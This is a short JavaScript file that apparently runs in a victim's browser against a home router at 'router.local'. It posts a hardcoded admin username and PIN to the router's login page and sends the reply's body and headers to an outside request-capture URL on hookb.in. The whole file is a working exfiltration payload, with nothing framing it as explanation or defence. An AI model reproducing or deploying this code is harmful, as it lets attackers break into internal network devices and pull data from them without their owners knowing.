const ROUTER = "http://router.local";
const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";

function forwardResponse(req) {
	let fwdxhr = new XMLHttpRequest();
	fwdxhr.open("POST", ENDPOINT, true);
	fwdxhr.setRequestHeader("Content-Type", "application/json");
	fwdxhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
	const data = JSON.stringify({
		"body": req.response,
		"headers": req.getAllResponseHeaders(),
	});
	fwdxhr.send(data);
}

//forwardResponse("foo");

let xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
	if (xhr.readyState === 4) {
		forwardResponse(xhr);
	}
}

// Initial request to get main.html
//xhr.open("GET", ROUTER, true);
//xhr.send('');

const formParams = "username=admin&pin=123456";

xhr.open("POST", ROUTER + "/login.php", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(formParams);
